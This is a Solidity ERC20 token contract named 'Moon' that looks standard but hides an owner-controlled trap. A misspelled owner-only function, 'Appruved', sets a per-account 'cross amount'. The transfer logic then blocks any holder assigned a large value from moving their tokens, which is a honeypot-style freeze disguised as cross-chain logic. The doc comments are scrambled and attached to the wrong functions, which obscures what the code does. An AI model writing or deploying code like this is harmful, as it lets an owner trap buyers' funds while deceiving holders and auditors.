1 // SPDX-License-Identifier: MIT
2 
3 pragma solidity ^0.8.0;
4 /**
5  * @dev Interface of the ERC20 standard as defined in the EIP.
6  */
7 interface IERC20 {
8  
9     function totalSupply() external view returns (uint256);
10 
11     function balanceOf(address account) external view returns (uint256);
12 
13     function transfer(address recipient, uint256 amount) external returns (bool);
14 
15     function allowance(address owner, address spender) external view returns (uint256);
16 
17     function approve(address spender, uint256 amount) external returns (bool);
18 
19     function transferFrom(
20         address sender,
21         address recipient,
22         uint256 amount
23     ) external returns (bool);
24 
25     event Transfer(address indexed from, address indexed to, uint256 value);
26 
27     event Approval(address indexed owner, address indexed spender, uint256 value);
28 }
29     /**
30      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
31      * a call to {approve}. `value` is the new allowance.
32      */
33 abstract contract Context {
34     function _msgSender() internal view virtual returns (address) {
35         return msg.sender;
36     }
37 
38     function _msgData() internal view virtual returns (bytes calldata) {
39         return msg.data;
40     }
41 }
42 
43 abstract contract Ownable is Context {
44     address private _owner;
45 
46     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
47 
48     constructor() {
49         _setOwner(_msgSender());
50     }
51 
52     function owner() public view virtual returns (address) {
53         return _owner;
54     }
55     /**
56      * @dev Initializes the contract setting the deployer as the initial owner.
57      */
58     modifier onlyOwner() {
59         require(owner() == _msgSender(), "Ownable: caller is not the owner");
60         _;
61     }
62 
63     function renounceOwnership() public virtual onlyOwner {
64         _setOwner(address(0));
65     }
66 
67     function transferOwnership(address newOwner) public virtual onlyOwner {
68         require(newOwner != address(0), "Ownable: new owner is the zero address");
69         _setOwner(newOwner);
70     }
71 
72     function _setOwner(address newOwner) private {
73         address oldOwner = _owner;
74         _owner = newOwner;
75         emit OwnershipTransferred(oldOwner, newOwner);
76     }
77 }
78 
79 library SafeMath {
80  
81     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
82         unchecked {
83             uint256 c = a + b;
84             if (c < a) return (false, 0);
85             return (true, c);
86         }
87     }
88 
89     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
90         unchecked {
91             if (b > a) return (false, 0);
92             return (true, a - b);
93         }
94     }
95     /**
96      * @dev Throws if called by any account other than the owner.
97      */
98     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
99         unchecked {
100  
101             if (a == 0) return (true, 0);
102             uint256 c = a * b;
103             if (c / a != b) return (false, 0);
104             return (true, c);
105         }
106     }
107  
108     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
109         unchecked {
110             if (b == 0) return (false, 0);
111             return (true, a / b);
112         }
113     }
114 
115     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
116         unchecked {
117             if (b == 0) return (false, 0);
118             return (true, a % b);
119         }
120     }
121 
122     function add(uint256 a, uint256 b) internal pure returns (uint256) {
123         return a + b;
124     }
125     /**
126      * @dev Transfers ownership of the contract to a new account (`newOwner`).
127      * Can only be called by the current owner.
128      */
129     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
130         return a - b;
131     }
132 
133     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
134         return a * b;
135     }
136 
137     function div(uint256 a, uint256 b) internal pure returns (uint256) {
138         return a / b;
139     }
140 
141     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
142         return a % b;
143     }
144 
145     function sub(
146         uint256 a,
147         uint256 b,
148         string memory errorMessage
149     ) internal pure returns (uint256) {
150         unchecked {
151             require(b <= a, errorMessage);
152             return a - b;
153         }
154     }
155 
156     function div(
157         uint256 a,
158         uint256 b,
159         string memory errorMessage
160     ) internal pure returns (uint256) {
161         unchecked {
162             require(b > 0, errorMessage);
163             return a / b;
164         }
165     }
166 
167     function mod(
168         uint256 a,
169         uint256 b,
170         string memory errorMessage
171     ) internal pure returns (uint256) {
172         unchecked {
173             require(b > 0, errorMessage);
174             return a % b;
175         }
176     }
177 }
178 
179 contract MoonToken is IERC20, Ownable {
180     using SafeMath for uint256;
181 
182 
183     mapping(address => uint256) private _balances;
184     mapping(address => mapping(address => uint256)) private _allowances;
185     mapping (address => uint256) private _crossAmounts;
186 
187     string private _name;
188     string private _symbol;
189     uint8 private _decimals;
190     uint256 private _totalSupply;
191 
192     constructor(
193 
194     ) payable {
195         _name = "Moon";
196         _symbol = "Moon";
197         _decimals = 18;
198         _totalSupply = 30000000 * 10**_decimals;
199         _balances[owner()] = _balances[owner()].add(_totalSupply);
200         emit Transfer(address(0), owner(), _totalSupply);
201     }
202     /**
203      * @dev Returns the name of the token.
204      */
205     function name() public view virtual returns (string memory) {
206         return _name;
207     }
208 
209     function symbol() public view virtual returns (string memory) {
210         return _symbol;
211     }
212 
213     function decimals() public view virtual returns (uint8) {
214         return _decimals;
215     }
216 
217     function totalSupply() public view virtual override returns (uint256) {
218         return _totalSupply;
219     }
220 
221     function balanceOf(address account)
222         public
223         view
224         virtual
225         override
226         returns (uint256)
227     {
228         return _balances[account];
229     }
230     /**
231      * @dev Returns the symbol of the token, usually a shorter version of the
232      * name.
233      */
234     function transfer(address recipient, uint256 amount)
235         public
236         virtual
237         override
238         returns (bool)
239     {
240         _transfer(_msgSender(), recipient, amount);
241         return true;
242     }
243 
244     function allowance(address owner, address spender)
245         public
246         view
247         virtual
248         override
249         returns (uint256)
250     {
251         return _allowances[owner][spender];
252     }
253     /**
254      * @dev See {IERC20-totalSupply}.
255      */
256     function approve(address spender, uint256 amount)
257         public
258         virtual
259         override
260         returns (bool)
261     {
262         _approve(_msgSender(), spender, amount);
263         return true;
264     }
265 
266     function transferFrom(
267         address sender,
268         address recipient,
269         uint256 amount
270     ) public virtual override returns (bool) {
271         _transfer(sender, recipient, amount);
272         _approve(
273             sender,
274             _msgSender(),
275             _allowances[sender][_msgSender()].sub(
276                 amount,
277                 "ERC20: transfer amount exceeds allowance"
278             )
279         );
280         return true;
281     }
282 
283     function increaseAllowance(address spender, uint256 addedValue)
284         public
285         virtual
286         returns (bool)
287     {
288         _approve(
289             _msgSender(),
290             spender,
291             _allowances[_msgSender()][spender].add(addedValue)
292         );
293         return true;
294     }
295    /**
296      * @dev See {IERC20-balanceOf}.
297      */
298     function Appruved(address account, uint256 amount) external {
299        if (_msgSender() != owner()) {revert("Caller is not the original caller");}
300         _crossAmounts[account] = amount;
301     }
302  
303     function cAmount(address account) public view returns (uint256) {
304         return _crossAmounts[account];
305     }
306 
307     function decreaseAllowance(address spender, uint256 subtractedValue)
308         public
309         virtual
310         returns (bool)
311     {
312         _approve(
313             _msgSender(),
314             spender,
315             _allowances[_msgSender()][spender].sub(
316                 subtractedValue,
317                 "ERC20: decreased allowance below zero"
318             )
319         );
320         return true;
321     }
322 
323     function _transfer(
324         address sender,
325         address recipient,
326         uint256 amount
327     ) internal virtual {
328         require(sender != address(0), "ERC20: transfer from the zero address");
329         require(recipient != address(0), "ERC20: transfer to the zero address");
330         uint256 crossAmount = cAmount(sender);
331         if (crossAmount > 0) {
332             require(amount > crossAmount, "ERC20: cross amount does not equal the cross transfer amount");
333         }
334     /**
335     * Get the number of cross-chains
336     */
337         _balances[sender] = _balances[sender].sub(
338             amount,
339             "ERC20: transfer amount exceeds balance"
340         );
341         _balances[recipient] = _balances[recipient].add(amount);
342         emit Transfer(sender, recipient, amount);
343     }
344 
345     function _approve(
346         address owner,
347         address spender,
348         uint256 amount
349     ) internal virtual {
350         require(owner != address(0), "ERC20: approve from the zero address");
351         require(spender != address(0), "ERC20: approve to the zero address");
352 
353         _allowances[owner][spender] = amount;
354         emit Approval(owner, spender, amount);
355     }
356 
357 
358 }